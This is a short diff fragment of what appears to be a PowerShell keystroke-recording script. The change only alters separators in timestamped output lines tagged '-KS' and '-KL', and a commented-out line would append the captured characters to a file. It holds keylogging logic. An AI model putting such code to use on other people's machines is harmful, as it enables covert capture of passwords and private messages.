@@ -59,7 +59,7 @@ while ($recording) {
       } 
 
       if ($newKey) {
-        (Get-Date -Format FileDateTime) + '-' + $key + '-KS'
+        (Get-Date -Format FileDateTime) + '--' + $key + '--KS'
         $newKey = $false
       }
 
@@ -82,7 +82,7 @@ while ($recording) {
       if ($letter -and ($key -like 'NoSpecial')) 
       {
 
-        (Get-Date -Format FileDateTime) + '-' + $mychar + '-KL'
+        (Get-Date -Format FileDateTime) + '--' + $mychar + '--KL'
         #[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
       } 
       }
